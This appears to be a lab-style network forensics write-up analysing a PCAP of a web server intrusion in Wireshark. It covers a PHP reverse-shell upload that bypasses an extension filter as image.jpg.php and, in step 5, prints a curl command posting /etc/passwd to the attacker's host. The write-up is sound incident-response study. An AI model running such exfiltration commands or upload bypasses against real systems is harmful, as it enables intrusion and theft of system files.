# Network Traffic Analysis - PCAP File

## Objective

This project aimed to investigate a suspicious activity detected on a company web server, captured and provided in the form of a PCAP file. The focus is to uncover the methods employed by the attacker, the vulnerabilities exploited, the techniques used to maintain unauthorized access to the server, and the sensitive file targeted for exfiltration.

### Skills Learned

- Advanced understanding of incident response and cybersecurity defense.
- Ability to examine captured network traffic.
- Adept knowledge of forensic techniques and actions to mitigate damages.
- Development of critical thinking and problem-solving skills in cybersecurity.

### Tools Used

- Wireshark for capturing and examining network traffic.

## Steps

1. Firstly I wanted to know the geolocation of the attacker IP to identify the source of network activity, such as potential attacks or unauthorized access. I went ahead by opening the provided PCAP file in Wireshark, navigated to the menu bar and selected Statistics -> Endpoint. From the Endpoints window, I clicked on the IPv4 tab to view all the IPv4 addresses that interacted with the network.


<img width="1919" height="920" alt="1" src="https://github.com/user-attachments/assets/d1b40951-abbf-4ebd-b28b-fd93e7d76c3e" />
img1

<img width="1919" height="920" alt="2" src="https://github.com/user-attachments/assets/f56235fd-7542-43bc-8237-8d946d94301b" />
img2

In the above img1 and img2 it showed that the source IP 117.11.88.124 is highlighted as it established a connection with the server at 24.49.63.79. I probed further to use the url "https://ipgeolocation.io" on a browser to search the IP address and the result is shown in the below image. The results revealed that the IP address is located in Tianjin, China.

<img width="1919" height="920" alt="3" src="https://github.com/user-attachments/assets/09e7f115-2b3e-4159-adac-64dcf98017b8" />
img3

In this case, I understood the attacker's orgin and Geo-blocking can then be implemented as a preventive measure to restrict traffic from high-risk or suspicious locations. Such measures reduce the likelihood of similar unauthorized activities while enhancing the network’s defense posture.

2. Secondly, I wanted to know the attacker's User-Agent because the attackers often spoof User-Agent strings to disguise their tools as legitimate browsers or applications. I wanted to know their application type, operating system, software version, and platform. For instance, a User-Agent string might specify whether the client is a desktop browser, mobile browser, or a specific tool like a web crawler. This information helps the server tailor its responses to fit the client’s capabilities, such as delivering mobile-friendly web pages to mobile browsers. And by monitoring for uncommon or suspicious User-Agent strings, organizations can detect malicious traffic, block specific tools or scripts, and refine their intrusion detection systems.

And I did this in Wireshark from the PCAP file, right-clicked on the relevant HTTP packet (as shown in the below screenshot) and selected Follow -> HTTP Stream.

<img width="1919" height="920" alt="4" src="https://github.com/user-attachments/assets/60b80a45-7c0c-472b-84dd-b01f228d12fb" />
img4

The captured HTTP GET request reveals the attacker’s User-Agent as Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0. This indicates the attacker is likely emulating a Linux-based Firefox browser, potentially to blend in with legitimate traffic and avoid detection.

3. Next, I wanted to know the name of the malicious web shell that was successfully uplaoded. In Wireshark, I filtered the ip address with the HTTP request

<img width="1920" height="920" alt="5" src="https://github.com/user-attachments/assets/8effc100-9d5b-44bb-a279-cd107d37dbd9" />
img5

The above img5 reveals two significant POST requests made by the attacker. In the first POST request, the attacker attempts to upload a file named image.php via the /reviews/upload.php endpoint. The content of the uploaded file is visible in the HTTP stream, showing a PHP code snippet designed to establish a reverse shell using the system function. While the img6 below shows that the attempt wass rejected by the server with an Invalid file format error message, indicating some server-side validation.

<img width="1919" height="922" alt="6" src="https://github.com/user-attachments/assets/2e83c22b-b3f3-4d8b-b5a0-ec414723e4d0" />
img6

In the second POST request, the attacker slightly modifies the file name to image.jpg.php and attempts to upload the same malicious content via the same endpoint.

<img width="1919" height="917" alt="7" src="https://github.com/user-attachments/assets/516d1137-5cb6-4047-aff6-be6b333808f3" />
img7

As seen in the above img7, the upload was successful, as indicated by the File uploaded successfully response from the server. The attacker successfully bypasses the server's validation by appending .jpg to the filename, which may have tricked the server's filtering mechanism. From the details in the screenshots, it is clear that the malicious web shell uploaded by the attacker was named image.jpg.php. This highlights the exploitation of improper input validation on the web server, enabling the attacker to execute malicious code and maintain unauthorized access to the server.

4. I also wanted to know the directory the website used to store the uploaded files.

<img width="1916" height="918" alt="8" src="https://github.com/user-attachments/assets/f3b1cd4b-f538-4dbb-88fd-ef8786fe54bc" />
img8

The HTTP stream captured in the img8 above shows a GET request to /reviews/uploads, where the server responds with a "301 Moved Permanently" status code, redirecting the client to the /reviews/uploads/ directory. The redirected response and subsequent server behavior confirm that the files uploaded via the /reviews/upload.php endpoint are stored in the /reviews/uploads/ directory.
This finding refines the understanding of the server's structure, indicating that /reviews/uploads/ is the specific directory where uploaded files, including potentially malicious ones, are stored.

5. And finally, I wanted to identify the file the attacker was trying to exfilterate. In Wireshark, I used this filter (tcp.port==8080) && (ip.src==24.49.63.79). This filter captures outbound traffic from the victim server 24.49.63.79 to the attacker's machine on port 8080, which was established for the reverse shell connection. Examining the captured TCP stream reveals that the attacker uses a curl command to attempt exfiltration. The specific command, curl -X POST -d /etc/passwd http://117.11.88.124:443/, indicates the attacker’s intent to transfer the /etc/passwd file to their machine over HTTP on port 443.

<img width="1919" height="919" alt="10" src="https://github.com/user-attachments/assets/741cc361-3791-439d-8d4c-2a404272cfa4" />
img8

Following this analysis, it is clear that the attacker attempted to exfiltrate the /etc/passwd file, highlighting the need to prioritize incident response actions to secure this sensitive data and prevent further breaches.
